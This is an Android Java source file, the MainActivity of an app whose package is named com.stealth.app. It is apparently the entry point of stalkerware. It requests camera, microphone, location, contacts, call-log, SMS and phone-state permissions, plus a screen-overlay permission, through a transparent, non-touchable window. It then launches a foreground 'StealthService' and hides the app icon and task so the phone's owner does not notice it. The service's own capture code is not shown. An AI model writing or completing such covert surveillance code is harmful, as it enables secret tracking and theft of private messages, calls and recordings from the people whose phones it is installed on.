// MainActivity.java
package com.stealth.app;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Window;
import android.view.WindowManager;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import android.Manifest;

public class MainActivity extends AppCompatActivity {

    // ✅ CAMERA included with all permissions
    private final String[] ALL_PERMISSIONS = {
        // ─── CAMERA (front + back) ───
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,       // needed for video with audio

        // ─── STORAGE ───
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,

        // ─── LOCATION ───
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,

        // ─── CONTACTS / CALLS / SMS ───
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,

        // ─── PHONE ───
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.PROCESS_OUTGOING_CALLS
    };

    private final ActivityResultLauncher<String[]> permLauncher =
        registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), result -> {
            // All permissions handled (granted or denied) — we proceed either way
            startStealthService();
            hideApp();
        });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // ===== Make Activity fully transparent =====
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        );
        setContentView(R.layout.activity_main);

        // Step 1: Request SYSTEM_ALERT_WINDOW overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
            startActivityForResult(overlayIntent, 101);
        } else {
            requestAllPermissions();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 101) {
            // Overlay done — now request all runtime permissions including CAMERA
            requestAllPermissions();
        }
    }

    private void requestAllPermissions() {
        boolean allGranted = true;
        for (String perm : ALL_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        if (allGranted) {
            startStealthService();
            hideApp();
        } else {
            // Launch permission dialog — includes CAMERA
            permLauncher.launch(ALL_PERMISSIONS);
        }
    }

    private void startStealthService() {
        Intent serviceIntent = new Intent(this, StealthService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void hideApp() {
        AppHider.hideIcon(this);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        } else {
            finish();
        }
    }
}